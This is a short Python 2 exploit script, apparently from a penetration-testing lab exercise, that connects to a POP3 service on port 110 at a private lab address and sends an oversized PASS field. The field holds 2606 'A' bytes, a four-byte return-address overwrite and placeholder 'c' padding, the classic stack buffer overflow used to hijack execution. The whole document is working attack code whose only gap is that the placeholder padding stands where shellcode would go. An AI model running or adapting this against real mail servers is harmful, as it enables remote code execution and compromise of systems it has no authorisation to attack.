#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer = "A"*2606 + '\x8F\x35\x4A\x5F' + 'c'*400

try:
    print "\nSending evil buffer..."
    s.connect(('192.168.56.109',110))
    data = s.recv(1024)
    s.send('USER test' + '\r\n')
    data = s.recv(1024)
    s.send('PASS ' + buffer + '\r\n')
    print "\nDone!,"
except:
    print "Could not connect"
